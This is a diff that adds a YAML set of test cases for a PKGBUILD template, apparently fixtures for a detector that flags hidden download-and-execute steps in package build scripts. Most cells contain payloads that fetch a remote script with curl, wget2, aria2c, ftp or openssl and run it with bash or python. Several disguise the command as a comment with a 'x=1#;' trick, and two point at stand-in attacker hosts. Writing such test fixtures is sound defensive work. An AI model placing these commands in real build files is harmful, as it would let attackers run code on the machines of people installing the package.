@@ -1,0 +1,74 @@
+template: template.PKGBUILD
+cells:
+- id: curl-to-file-then-bash
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1#; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > \"$srcdir\"\
+      /s.sh\n  bash \"$srcdir\"/s.sh"
+- id: wget2-pipe-to-shell
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: '  x=1#; wget2 -q -O- https://github.com/example/harness-baseline/raw/main/stage | bash'
+- id: curl-to-configure-then-make
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1#; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > \"$srcdir\"\
+      /configure\n  bash \"$srcdir\"/configure\n  make"
+- id: curl-to-setup-py-then-python
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1#; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > setup.py\n\
+      \  python3 setup.py build\n  make"
+- id: aria2c-to-file-then-bash
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1#; aria2c -q --allow-overwrite=true https://github.com/example/harness-baseline/raw/main/stage\
+      \ > \"$srcdir\"/s.sh\n  bash \"$srcdir\"/s.sh"
+- id: ftp-to-file-then-bash
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1#; ftp -n github.com <<< \"get https://github.com/example/harness-baseline/raw/main/stage\"\
+      \ > \"$srcdir\"/s.sh\n  bash \"$srcdir\"/s.sh"
+- id: ctl-attacker-host-adds-bucket
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    payload: "  x=1#; curl -fsSL https://attacker.test/p > \"$srcdir\"/configure\n  bash \"$srcdir\"/configure\n\
+      \  make"
+- id: ctl-no-glued-hash
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1 ; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > \"$srcdir\"\
+      /s.sh\n  bash \"$srcdir\"/s.sh"
+- id: ctl-spaced-hash-not-live
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1 # ; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > \"$srcdir\"\
+      /s.sh\n  bash \"$srcdir\"/s.sh"
+- id: ctl-real-comment-only
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  # curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > \"$srcdir\"\
+      /s.sh\n  make"
+- id: ctl-glued-hash-value-reused
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    payload: "  x=1#; curl -fsSL https://github.com/example/harness-baseline/raw/main/stage > \"$srcdir\"\
+      /s.sh\n  note \"$x\"\n  bash \"$srcdir\"/s.sh"
+- id: ctl-glued-hash-openssl-and-h016-trick
+  vars:
+    url: https://evil.example/harness-baseline
+    source: https://evil.example/harness-baseline-1.0.tar.gz
+    payload: "  x=1#; printf 'GET /p/s HTTP/1.1\\r\\nHost: evil.example\\r\\n\\r\\n' \\\n    | openssl\
+      \ s_client -quiet -connect evil.example:8443 2>/dev/null \\\n    | sed -n '/^\\r*$/,$p' > \"$srcdir\"\
+      /configure\n  bash \"$srcdir\"/configure\n  make"
